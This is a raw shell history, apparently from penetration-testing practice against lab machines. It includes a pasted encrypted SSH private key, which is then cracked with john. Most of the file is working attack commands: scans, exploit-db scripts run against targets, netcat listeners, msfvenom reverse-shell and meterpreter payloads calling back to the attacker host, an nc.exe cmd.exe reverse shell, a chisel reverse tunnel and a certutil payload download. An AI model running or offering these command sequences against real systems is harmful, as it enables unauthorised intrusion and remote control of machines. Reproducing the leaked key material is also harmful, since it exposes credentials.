KEY-----
 7250  2020-11-19 19:12  vim joannakey 
 7251  2020-11-19 19:13  -----BEGIN RSA PRIVATE KEY-----                                                                                                                                                                                                                                                                                                                                         \nProc-Type: 4,ENCRYPTED                                                                                                                                                                                                                                                                                                                                                  \nDEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D                                                                                                                                                                                                                                                                                                                  \n                                                                                                                                                                                                                                                                                                                                                                        \nkG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8                                                                                                                                                                                                                                                                                                        \nad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO                                                                                                                                                                                                                                                                                                        \nShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE                                                                                                                                                                                                                                                                                                        \n6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ                                                                                                                                                                                                                                                                                                        \nZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du                                                                                                                                                                                                                                                                                                        \ny8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI                                                                                                                                                                                                                                                                                                        \n9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4                                                                                                                                                                                                                                                                                                        \npiC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/                                                                                                                                                                                                                                                                                                        \n/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH                                                                                                                                                                                                                                                                                                        \n40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ                                                                                                                                                                                                                                                                                                        \nfnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb\n9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80\nX1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg\nS33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F\nFnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh\nTh5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa\nRTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z\nuhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr\n1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2\nXGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79\nyPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM\n+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt\nqlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt\nz0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe\nK1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN\n-----END RSA PRIVATE KEY-----
 7252  2020-11-19 19:13  l
 7253  2020-11-19 19:13  vim joannakey 
 7254  2020-11-19 19:18  chmod +x joannakey
 7255  2020-11-19 19:18  ssh -i joannakey joanna@10.10.10.171
 7256  2020-11-19 19:18  chmod 600 joannakey
 7257  2020-11-19 19:18  ssh2john
 7258  2020-11-19 19:19  locate / | ssh2john
 7259  2020-11-19 19:19  locate / | ssh2
 7260  2020-11-19 19:19  locate / | grep ssh2john
 7261  2020-11-19 19:24  /usr/share/john/ssh2john.py joannakey
 7262  2020-11-19 19:24  /usr/share/john/ssh2john.py joannakey > passhassjoanna
 7263  2020-11-19 19:24  l
 7264  2020-11-19 19:24  john
 7265  2020-11-19 19:24  john  -w=/usr/share/wordlists/rockyou.txt passhassjoanna
 7266  2020-11-19 19:24  ssh joanna@10.10.10.171
 7267  2020-11-19 19:25  ssh -i joannakey joanna@10.10.10.171
 7268  2020-11-19 19:25  cd ..
 7269  2020-11-19 19:25  ;s
 7270  2020-11-19 19:25  ls
 7271  2020-11-19 19:26  cd linux_priv_esc_scripts
 7272  2020-11-19 19:26  s
 7273  2020-11-19 19:26  ls
 7274  2020-11-19 19:26  sudo python -m SimpleHTTPServer 80
 7275  2020-11-20 00:24  exit
 7276  2020-11-21 21:27  ping 10.10.10.143
 7277  2020-11-21 21:27  cd ..
 7278  2020-11-21 21:27  ls
 7279  2020-11-21 21:27  ./create_direcotry.sh 10.10.10.143
 7280  2020-11-21 21:27  ls
 7281  2020-11-21 21:27  cd results
 7282  2020-11-21 21:27  l
 7283  2020-11-21 21:27  cd 10.10.10.143
 7284  2020-11-21 21:27  l
 7285  2020-11-21 21:27  cd scans
 7286  2020-11-21 21:27  l
 7287  2020-11-21 21:27  nmap -sCV -oA top1000 10.10.10.143
 7288  2020-11-21 21:28  nmap -p- -T4 -oA allport 10.10.10.143
 7289  2020-11-21 21:31  sudo vim /etc/hosts
 7290  2020-11-21 21:40  gobuster dir -u supersecurehotel.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o gobuster80.txt
 7291  2020-11-21 21:43  dig supersecurehotel.htb
 7292  2020-11-21 21:44  cat ~/OSCP/results/10.11.1.223/scans/_manual_commands.txt
 7293  2020-11-21 21:44  cat ~/OSCP/results/10.11.1.223/scans/_commands.log
 7294  2020-11-21 21:45  nikto -ask=no -h http://10.11.1.143 2>&1 | tee "niktoscan"
 7295  2020-11-21 22:01  nikto -ask=no -h http://10.10.10.143 2>&1 | tee "niktoscan"
 7296  2020-11-21 22:30  ls
 7297  2020-11-21 22:30  cat allport.nmap
 7298  2020-11-21 22:30  cat gobuster80.txt
 7299  2020-11-21 22:31  ls
 7300  2020-11-22 06:07  ip a
 7301  2020-11-22 06:07  cd ..
 7302  2020-11-22 06:08  cd exploit
 7303  2020-11-22 06:08  sudo nc -lvp 443
 7304  2020-11-22 06:08  ip a
 7305  2020-11-22 06:08  sudo nc -lvp 443
 7306  2020-11-22 06:11  stty raw -echo
 7307  2020-11-22 06:11  fg
 7308  2020-11-22 06:11  sudo nc -lvp 443
 7309  2020-11-22 06:13  stty raw -echo
 7310  2020-11-22 06:13  sudo nc -lvp 443
 7311  2020-11-22 07:23  cd htb
 7312  2020-11-22 07:23  cd HTB/
 7313  2020-11-22 07:23  cd linux_priv_esc_scripts
 7314  2020-11-22 07:23  ls
 7315  2020-11-22 07:24  sudo python -m SimpleHTTPServer 80
 7316  2020-11-22 07:27  exit
 7317  2020-11-22 07:27  sudo nc -lvp 443
 7318  2020-11-22 07:52  sudo nc -lvp 9001
 7319  2020-11-22 07:53  ip a
 7320  2020-11-22 07:53  sudo nc -lvp 9001
 7321  2020-11-22 07:55  sudo nc -lvp 443
 7322  2020-11-22 07:59  OA
 7323  2020-11-22 07:59  sudo nc -lvp 443
 7324  2020-11-22 08:04  cd HTB/results/
 7325  2020-11-22 08:04  cat /etc/hosts
 7326  2020-11-22 08:05  cd 10.10.10.143
 7327  2020-11-22 08:05  cd exploit
 7328  2020-11-22 08:05  touch pepper_key
 7329  2020-11-22 08:05  vim pepper_key
 7330  2020-11-22 08:05  chmod 600 pepper_key
 7331  2020-11-22 08:05  ssh -i pepper_key pepper@10.10.10.143
 7332  2020-11-22 08:05  l
 7333  2020-11-22 08:05  vim pepper_key
 7334  2020-11-22 08:06  l
 7335  2020-11-22 08:06  ssh -i pepper_key pepper@10.10.10.143
 7336  2020-11-22 08:07  cd HTB/linux_priv_esc_scripts
 7337  2020-11-22 08:07  sudo python -m SimpleHTTPServer 80
 7338  2020-11-22 08:12  ssh -i pepper_key pepper@10.10.10.143
 7339  2020-11-22 08:14  ip a
 7340  2020-11-22 08:14  exit
 7341  2020-11-22 08:15  sudo nc -lvp 443
 7342  2020-11-22 08:17  exit
 7343  2020-11-22 18:38  ping 10.10.10.198
 7344  2020-11-22 18:38  ls
 7345  2020-11-22 18:38  cd ..
 7346  2020-11-22 18:38  cd 10.10.10.198ls
 7347  2020-11-22 18:38  cd 10.10.10.198
 7348  2020-11-22 18:38  ls
 7349  2020-11-22 18:38  cd scans
 7350  2020-11-22 18:38  l
 7351  2020-11-22 18:38  cd .
 7352  2020-11-22 18:38  l
 7353  2020-11-22 18:38  cd ..
 7354  2020-11-22 18:38  l
 7355  2020-11-22 18:38  cd exploit
 7356  2020-11-22 18:38  l
 7357  2020-11-22 18:38  vim 48506.py
 7358  2020-11-22 18:39  python3 48506.py 10.10.10.198
 7359  2020-11-22 18:39  python3 48506.py 
 7360  2020-11-22 18:39  python 48506.py 10.10.10.198
 7361  2020-11-22 18:39  python 48506.py http://10.10.10.198
 7362  2020-11-22 18:40  cd
 7363  2020-11-22 18:40  ls
 7364  2020-11-22 18:40  l
 7365  2020-11-22 18:41  vim .tmux.conf
 7366  2020-11-22 18:42  ping 10.10.10.198
 7367  2020-11-22 18:42  cd ..
 7368  2020-11-22 18:42  l
 7369  2020-11-22 18:42  cd scans
 7370  2020-11-22 18:42  l
 7371  2020-11-22 18:42  cd ..
 7372  2020-11-22 18:42  l
 7373  2020-11-22 18:43  cd exploit
 7374  2020-11-22 18:43  l
 7375  2020-11-22 18:43  python 48506.py http://10.10.10.198:8080
 7376  2020-11-22 18:43  python 48506.py http://10.10.10.198:8080/
 7377  2020-11-22 18:44  sudo nc -lvp 443
 7378  2020-11-22 18:44  ip a
 7379  2020-11-22 18:44  sudo nc -lvp 443
 7380  2020-11-22 18:45  python 48506.py http://10.10.10.198:8080/
 7381  2020-11-22 18:48  cd HTB/
 7382  2020-11-22 18:48  ls
 7383  2020-11-22 18:48  cd results
 7384  2020-11-22 18:48  l
 7385  2020-11-22 18:48  cd
 7386  2020-11-22 18:48  locate shell.ps1
 7387  2020-11-22 18:48  locate shell.exe
 7388  2020-11-22 18:48  cd /home/kali/OSCP/results/10.11.1.73/exploit/
 7389  2020-11-22 18:49  sudo python -m SimpleHTTPServer 80
 7390  2020-11-22 18:51  sudo nc -lvp 443
 7391  2020-11-22 18:57  rlwrap nc -nvlp 443
 7392  2020-11-22 18:57  sudo  nc -nvlp 443
 7393  2020-11-22 18:58  nc --version
 7394  2020-11-22 18:58  nc -v
 7395  2020-11-22 18:58  nc
 7396  2020-11-22 18:58  nc --version
 7397  2020-11-22 18:58  whicn c
 7398  2020-11-22 18:58  which nc
 7399  2020-11-22 18:58  nc -v
 7400  2020-11-22 18:58  nc -h
 7401  2020-11-22 18:58  sudo nc -lvp 443
 7402  2020-11-22 18:59  sudo  nc -nvlp 443
 7403  2020-11-22 19:07  cd ..
 7404  2020-11-22 19:07  cd windows_priv_esc_scripts
 7405  2020-11-22 19:07  l
 7406  2020-11-22 19:08  sudo python -m SimpleHTTPServer 80
 7407  2020-11-22 19:20  sudo  nc -nvlp 4444
 7408  2020-11-22 19:21  sudo nc -nlvp 4444
 7409  2020-11-22 19:22  ip a
 7410  2020-11-22 19:27  sudo apt install rlwrap 
 7411  2020-11-22 19:28  rlwrap nc -nvlp 443
 7412  2020-11-22 19:28  sudo rlwrap nc -nvlp 443
 7413  2020-11-22 19:29  sudo systemctl restart sshd.service
 7414  2020-11-22 19:37  ip a
 7415  2020-11-22 19:46  l
 7416  2020-11-22 19:46  cd
 7417  2020-11-22 19:46  cd RandomShit
 7418  2020-11-22 19:46  ls
 7419  2020-11-22 19:46  l
 7420  2020-11-22 19:46  cp ~/.tmux.conf ./
 7421  2020-11-22 19:46  l
 7422  2020-11-22 19:46  git add *
 7423  2020-11-22 19:46  git commit -m "tmux updated"
 7424  2020-11-22 19:46  git add .
 7425  2020-11-22 19:46  git commit -m "tmux updated"
 7426  2020-11-22 19:47  git push
 7427  2020-11-22 19:50  locate / | grep plink
 7428  2020-11-22 19:50  cd /home/kali/Downloads/plink.exe
 7429  2020-11-22 19:50  cd /home/kali/Downloads/
 7430  2020-11-22 19:51  sudo impacket-smbserver SPITFIRE  /home/kali/Downloads\n
 7431  2020-11-22 19:55  ip a
 7432  2020-11-22 19:55  sudo impacket-smbserver SPITFIRE  /home/kali/Downloads\n
 7433  2020-11-22 22:50  ls
 7434  2020-11-22 22:50  cd HTB/results/10.10.10.198
 7435  2020-11-22 22:50  l
 7436  2020-11-22 22:50  cd exploit
 7437  2020-11-22 22:50  l
 7438  2020-11-22 22:50  python 48506.py http://10.10.10.198:8080/
 7439  2020-11-22 22:51  locate / | grep plink
 7440  2020-11-22 22:51  cd /home/kali/Downloads/
 7441  2020-11-22 22:51  sudo python -m SimpleHTTPServer 80
 7442  2020-11-23 02:06  curl https://i.jpillora.com/chisel\! | bash
 7443  2020-11-23 02:06  ls
 7444  2020-11-23 02:07  cd Downloads
 7445  2020-11-23 02:07  sudo curl https://i.jpillora.com/chisel\! | bash
 7446  2020-11-23 02:07  sudo -s
 7447  2020-11-23 02:08  /usr/local/bin/chisel
 7448  2020-11-23 02:14  unzip chisel_1.7.3_windows_amd64.gz
 7449  2020-11-23 02:15  tar -xvf chisel_1.7.3_windows_amd64.gz
 7450  2020-11-23 02:16  exit
 7451  2020-11-23 02:16  gzip -d chisel_1.7.3_windows_amd64.gz
 7452  2020-11-23 02:16  ls
 7453  2020-11-23 02:17  l
 7454  2020-11-23 02:17  grep ch
 7455  2020-11-23 02:17  grep "ch"
 7456  2020-11-23 02:17  ls
 7457  2020-11-23 02:17  cd chisel_1.7.3_windows_amd64
 7458  2020-11-23 02:17  ls
 7459  2020-11-23 02:17  rm chisel_1.7.3_windows_amd64 
 7460  2020-11-23 02:18  gunzip chisel_1.7.3_windows_amd64.gz
 7461  2020-11-23 02:18  ls
 7462  2020-11-23 02:18  cat chisel_1.7.3_windows_amd64
 7463  2020-11-23 02:18  ls
 7464  2020-11-23 02:19  sudo python -m SimpleHTTPServer 80
 7465  2020-11-23 04:50  ls
 7466  2020-11-23 04:50  ./chisel_1.7.3_windows_amd64 server -p 8000 --reverse
 7467  2020-11-23 04:50  sudo ./chisel_1.7.3_windows_amd64 server -p 8000 --reverse
 7468  2020-11-23 04:50  sudo -s
 7469  2020-11-23 04:51  /usr/local/bin/chisel
 7470  2020-11-23 04:51  /usr/local/bin/chisel server -p 8000 --reverse 
 7471  2020-11-23 04:52  ls
 7472  2020-11-23 04:53  l
 7473  2020-11-23 04:53  nmap 127.0.0.1
 7474  2020-11-23 05:15  searchsploit cloudme
 7475  2020-11-23 05:15  msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
 7476  2020-11-23 05:15  searchsploit cloudme
 7477  2020-11-23 05:16  cd HTB/results/10.10.10.198
 7478  2020-11-23 05:16  l
 7479  2020-11-23 05:16  cd exploit
 7480  2020-11-23 05:16  l
 7481  2020-11-23 05:16  searchsploit cloudme
 7482  2020-11-23 05:16  locate windows/remote/48389.py
 7483  2020-11-23 05:16  cp /usr/share/exploitdb/exploits/windows/remote/48389.py ./
 7484  2020-11-23 05:16  ls
 7485  2020-11-23 05:16  vim 48389.py
 7486  2020-11-23 05:17  msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.51 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload
 7487  2020-11-23 05:18  cd 
 7488  2020-11-23 05:18  cd HTB/results/10.10.10.198/exploit
 7489  2020-11-23 05:18  msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.51 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload
 7490  2020-11-23 05:18  ls
 7491  2020-11-23 05:18  vim 48389.py
 7492  2020-11-23 05:19  rlwrap nc -lnvp 443
 7493  2020-11-23 05:19  sudo rlwrap nc -lnvp 443
 7494  2020-11-23 05:19  python3 48389.py
 7495  2020-11-23 05:20  vim 48389.py
 7496  2020-11-23 05:22  msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload
 7497  2020-11-23 05:22  ip a
 7498  2020-11-23 05:22  msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.51 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload
 7499  2020-11-23 05:22  exit
 7500  2020-11-23 05:22  vim 48389.py
 7501  2020-11-23 05:23  sudo rlwrap nc -lnvp 443
 7502  2020-11-23 05:23  python3 48389.py
 7503  2020-11-23 05:23  sudo rlwrap nc -lnvp 443
 7504  2020-11-23 05:23  python 48389.py
 7505  2020-11-23 05:23  ss | grep listening
 7506  2020-11-23 05:24  nmap 127.0.0.1
 7507  2020-11-23 05:24  sudo rlwrap nc -lnvp 443
 7508  2020-11-23 05:24  python 48389.py
 7509  2020-11-23 05:24  python3 48389.py
 7510  2020-11-23 05:27  exit
 7511  2020-11-23 05:27  python 48506.py http://10.10.10.198:8080/
 7512  2020-11-23 05:27  /usr/local/bin/chisel server -p 8000 --reverse 
 7513  2020-11-23 05:28  nmap 127.0.0.1
 7514  2020-11-23 05:28  sudo rlwrap nc -lnvp 443
 7515  2020-11-23 05:28  vim 48
 7516  2020-11-23 05:28  vim 48389.py
 7517  2020-11-23 05:28  python3 48389.py
 7518  2020-11-23 05:29  exit
 7519  2020-11-23 06:44  /usr/local/bin/chisel server -p 8000 --reverse 
 7520  2020-11-23 06:45  ls
 7521  2020-11-23 06:45  python 48506.py http://10.10.10.198:8080/
 7522  2020-11-23 06:46  ip a
 7523  2020-11-23 06:47  cd HTB/results/10.10.10.198/exploit
 7524  2020-11-23 06:47  l
 7525  2020-11-23 06:47  sudo rlwrap nc -lnvp 443
 7526  2020-11-23 06:47  python3 48389.py
 7527  2020-11-23 06:48  sudo netstat -ltup 
 7528  2020-11-23 06:49  python 48506.py http://10.10.10.198:8080/
 7529  2020-11-23 06:49  /usr/local/bin/chisel server -p 8000 --reverse 
 7530  2020-11-23 06:49  python3 48389.py
 7531  2020-11-23 06:58  python 48506.py http://10.10.10.198:8080/
 7532  2020-11-23 06:59  sudo python -m SimpleHTTPServer 80
 7533  2020-11-23 06:59  l
 7534  2020-11-23 06:59  ls
 7535  2020-11-23 06:59  sudo python -m SimpleHTTPServer 80
 7536  2020-11-23 07:01  /usr/local/bin/chisel server -p 8000 --reverse 
 7537  2020-11-23 07:01  exit
 7538  2020-11-23 07:02  ls
 7539  2020-11-23 07:02  locate / | grep nc.exe
 7540  2020-11-23 07:02  ./ /home/kali/Downloads/nc.exe ./
 7541  2020-11-23 07:02  cp /home/kali/Downloads/nc.exe ./
 7542  2020-11-23 07:02  l
 7543  2020-11-23 07:02  python 48506.py http://10.10.10.198:8080/
 7544  2020-11-23 07:02  sudo python -m SimpleHTTPServer 80
 7545  2020-11-23 07:03  msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.51 443' -b '\x00\x0A\x0D' -f py -v payload
 7546  2020-11-23 07:03  sudo netstat -ltup 
 7547  2020-11-23 07:04  exit
 7548  2020-11-23 07:04  ls
 7549  2020-11-23 07:04  vim 48506.py
 7550  2020-11-23 07:04  vim 48389.py
 7551  2020-11-23 07:05  sudo rlwrap nc -lnvp 443
 7552  2020-11-23 07:05  python 48389.py
 7553  2020-11-23 10:07  exity
 7554  2020-11-23 10:07  exit
 7555  2020-11-23 10:07  ls
 7556  2020-11-25 20:21  ip a
 7557  2020-11-25 20:22  nmap   192.168.182.1/24
 7558  2020-11-25 20:22  exit
 7559  2020-11-25 20:24  nmap   192.168.182.1/23
 7560  2020-11-25 20:51  netdiscover eth0
 7561  2020-11-25 20:51  netdiscover -i eth0
 7562  2020-11-25 20:51  sudo netdiscover -i eth0
 7563  2020-11-25 20:58  nmap 192.168.182.2
 7564  2020-11-25 20:59  nmap -A 192.168.182.1
 7565  2020-11-25 21:06  sudo netdiscover -i eth0
 7566  2020-11-25 21:09  cd ..
 7567  2020-11-25 21:09  cd
 7568  2020-11-25 21:09  ls
 7569  2020-11-25 21:10  nmap -sCV -p-  192.168.182.1
 7570  2020-11-25 21:34  rdesktop  192.168.182.1
 7571  2020-11-25 21:34  curl https://192.168.182.1/
 7572  2020-11-25 21:34  curl http://192.168.182.1/
 7573  2020-11-25 21:36  nmap  -p-  -T4 192.168.182.1
 7574  2020-11-25 23:44  ping 10.10.10.5
 7575  2020-11-25 23:44  ping 10.10.10.15
 7576  2020-11-25 23:44  ping 10.10.10.2
 7577  2020-11-25 23:44  ping 10.10.10.3
 7578  2020-11-25 23:44  ping 10.10.10.4
 7579  2020-11-25 23:44  ping 10.10.10.5
 7580  2020-11-25 23:44  cd thb
 7581  2020-11-25 23:44  cd HTB/results
 7582  2020-11-25 23:44  l
 7583  2020-11-25 23:44  cd ..
 7584  2020-11-25 23:44  ./create_direcotry.sh 10.10.10.5
 7585  2020-11-25 23:44  l
 7586  2020-11-25 23:44  cd results
 7587  2020-11-25 23:44  l
 7588  2020-11-25 23:44  cd 10.10.10.5
 7589  2020-11-25 23:44  ls
 7590  2020-11-25 23:44  cd scans
 7591  2020-11-25 23:45  nmap -sCV -oA topports 10.10.10.5 
 7592  2020-11-25 23:46  gobuster dir -u 10.10.10.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o gobuster80.txt
 7593  2020-11-25 23:46  cd HTB
 7594  2020-11-25 23:46  ls
 7595  2020-11-25 23:46  cd results
 7596  2020-11-25 23:46  ls
 7597  2020-11-25 23:46  cd 10.10.10.5
 7598  2020-11-25 23:46  ls
 7599  2020-11-25 23:46  cd scans
 7600  2020-11-25 23:46  nikto -ask=no -h http://10.10.10.5 2>&1 | tee "niktoscan"
 7601  2020-11-25 23:51  ls
 7602  2020-11-25 23:54  ftp 10.10.10.5
 7603  2020-11-25 23:58  ls
 7604  2020-11-25 23:58  #msfvenom -a x64 --platform Windows -p  windows/x64/shell/bind_tcp lhost=192.168.119.217 lport=5985 -e x64/xor_dynamic   -b '\x00' -f aspx-exe -o rshell.aspx-exe
 7605  2020-11-25 23:58  l
 7606  2020-11-25 23:58  ip a
 7607  2020-11-26 00:00  msfvenom -a x64 --platform Windows -p  windows/x64/shell/bind_tcp lhost=10.10.14.39 lport=443 -e x64/xor_dynamic   -b '\x00' -f aspx-exe -o rshell.aspx-exe
 7608  2020-11-26 00:00  ip a
 7609  2020-11-26 00:01  msfvenom  -p  windows/meterpreter/reverse_tcp  lhost=10.10.14.39 lport=4444  -f aspx -o meterpreter.aspx
 7610  2020-11-26 00:01  l
 7611  2020-11-26 00:01  ftp 10.10.10.5
 7612  2020-11-26 00:03  sudo msfconsole -q -x "use exploit/multi/handler;\\n>\nset PAYLOAD php/meterpreter/reverse_tcp;\\n>\nset LHOST 10.10.14.39;\\n>\nset LPORT 4444;\\n>\nrun"
 7613  2020-11-26 00:03  sudo msfconsole -q -x "use exploit/multi/handler;\\nset PAYLOAD php/meterpreter/reverse_tcp;\\nset LHOST 10.10.14.39;\\nset LPORT 4444;\\nrun"
 7614  2020-11-26 00:03  exit
 7615  2020-11-26 00:04  msfvenom  -p  windows/x64/meterpreter/reverse_tcp  lhost=10.10.14.39 lport=4444  -f aspx -o meterpreter64.aspx
 7616  2020-11-26 00:05  cat topports.nmap
 7617  2020-11-26 00:05  ftp 10.10.10.5
 7618  2020-11-26 00:06  sudo msfconsole -q -x "use exploit/multi/handler;\\nset PAYLOAD php/meterpreter/reverse_tcp;\\nset LHOST 10.10.14.39;\\nset LPORT 4444;\\nrun"
 7619  2020-11-26 00:06  ls
 7620  2020-11-26 00:07  ip a
 7621  2020-11-26 00:07  msfvenom  -p  windows/x64/meterpreter/reverse_tcp  lhost=10.10.14.39 lport=4444  -f aspx -o meterpreter64.aspx
 7622  2020-11-26 00:07  ftp 10.10.10.5
 7623  2020-11-26 00:07  cat topports.nmap
 7624  2020-11-26 00:07  ftp 10.10.10.5
 7625  2020-11-26 00:08  sudo msfconsole -q -x "use exploit/multi/handler;\\nset PAYLOAD php/meterpreter/reverse_tcp;\\nset LHOST 10.10.14.39;\\nset LPORT 4444;\\nrun"
 7626  2020-11-26 00:08  ls
 7627  2020-11-26 00:09  msfvenom -a x64 --platform Windows -p  windows/x64/shell/bind_tcp lhost=10.10.14.39 lport=4444 -e x64/xor_dynamic   -b '\x00' -f aspx-exe -o rshell.aspx-exe
 7628  2020-11-26 00:09  ftp 10.10.10.5
 7629  2020-11-26 00:10  sudo rlwrap nc -lnvp 4444
 7630  2020-11-26 00:11  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.39 LPORT=4444 -f exe -a x64 -o > shellx64args.exe
 7631  2020-11-26 00:14  ftp 10.10.10.5
 7632  2020-11-26 00:14  sudo rlwrap nc -lnvp 4444
 7633  2020-11-26 00:17  ftp 10.10.10.5
 7634  2020-11-26 00:18  sudo msfconsole -q -x "use exploit/multi/handler;\\nset PAYLOAD php/meterpreter/reverse_tcp;\\nset LHOST 10.10.14.39;\\nset LPORT 4444;\\nrun"
 7635  2020-11-26 00:19  ip a
 7636  2020-11-26 00:20  #msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.39 LPORT=4444 -f exe -a x64 -o > shellx64args.exe
 7637  2020-11-26 00:20  msfvenom  -p  windows/x64/meterpreter/reverse_tcp  lhost=10.10.14.39 lport=4444  -f aspx -o meterpreter64.aspx
 7638  2020-11-26 00:20  #msfvenom  -p  windows/x64/meterpreter/reverse_tcp  lhost=10.10.14.39 lport=4444  -f aspx -o meterpreter64.aspx
 7639  2020-11-26 00:21  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.39 LPORT=4444 -f aspx -a x64 -o > shellx64args.aspx
 7640  2020-11-26 00:21  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.39 LPORT=4444 -f aspx  -o > shellx64args.aspx
 7641  2020-11-26 00:21  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.39 LPORT=4444 -f exe -a x64 -o > shellx64args.exe
 7642  2020-11-26 00:22  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.39 LPORT=4444 -f aspx > shell.aspx
 7643  2020-11-26 00:22  cat topports.nmap
 7644  2020-11-26 00:22  ftp 10.10.10.5
 7645  2020-11-26 00:23  sudo rlwrap nc -lnvp 4444
 7646  2020-11-26 00:24  sudo rlwrap nc -lnvp 443
 7647  2020-11-26 00:24  ftp 10.10.10.5
 7648  2020-11-26 00:24  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.39 LPORT=4444 -f aspx > shell.aspx
 7649  2020-11-26 00:24  sudo rlwrap nc -lnvp 4444
 7650  2020-11-26 00:24  cat topports.nmap
 7651  2020-11-26 00:24  ftp 10.10.10.5
 7652  2020-11-26 00:25  sudo rlwrap nc -lnvp 4444
 7653  2020-11-26 01:34  cd HTB
 7654  2020-11-26 01:34  ls
 7655  2020-11-26 01:34  cd windows_priv_esc_scripts
 7656  2020-11-26 01:34  ls
 7657  2020-11-26 01:35  sudo python -m SimpleHTTPServer 80
 7658  2020-11-26 02:13  touch copycommands
 7659  2020-11-26 02:13  vim copycommands
 7660  2020-11-26 02:13  ip a
 7661  2020-11-26 02:13  cat  copycommands
 7662  2020-11-26 02:13  certutil.exe -urlcache -split -f "http://10.10.14.39/winPEAS.exe" winPEAS.exe
 7663  2020-11-26 02:13  sudo python -m SimpleHTTPServer 80
 7664  2020-11-26 02:14  l
 7665  2020-11-26 02:14  sudo python -m SimpleHTTPServer 80
 7666  2020-11-26 02:15  l
 7667  2020-11-26 02:15  certutil.exe -urlcache -split -f "http://10.10.14.39/winPEAS.exe" winPEAS.exe
 7668  2020-11-26 02:15  sudo python -m SimpleHTTPServer 80
 7669  2020-11-26 02:16  locate winpeas
 7670  2020-11-26 02:16  cd /home/kali/Downloads/privilege-escalation-awesome-scripts-suite/winPEAS/
 7671  2020-11-26 02:16  l
 7672  2020-11-26 02:16  cd ..
 7673  2020-11-26 02:16  l
 7674  2020-11-26 02:16  cd winPEAS
 7675  2020-11-26 02:16  l
 7676  2020-11-26 02:16  cd winPEASexe
 7677  2020-11-26 02:16  l
 7678  2020-11-26 02:16  cd winPEAS
 7679  2020-11-26 02:16  l
 7680  2020-11-26 02:16  cd obj
 7681  2020-11-26 02:16  l
 7682  2020-11-26 02:16  cd x86
 7683  2020-11-26 02:16  l
 7684  2020-11-26 02:16  cd Release
 7685  2020-11-26 02:16  l
 7686  2020-11-26 02:17  sudo python -m SimpleHTTPServer 80
 7687  2020-11-26 02:17  cd ..
 7688  2020-11-26 02:17  l
 7689  2020-11-26 02:17  cd ..
 7690  2020-11-26 02:17  l
 7691  2020-11-26 02:17  cd winPEASbat
 7692  2020-11-26 02:17  l
 7693  2020-11-26 02:17  sudo python -m SimpleHTTPServer 80
 7694  2020-11-26 02:19  exit
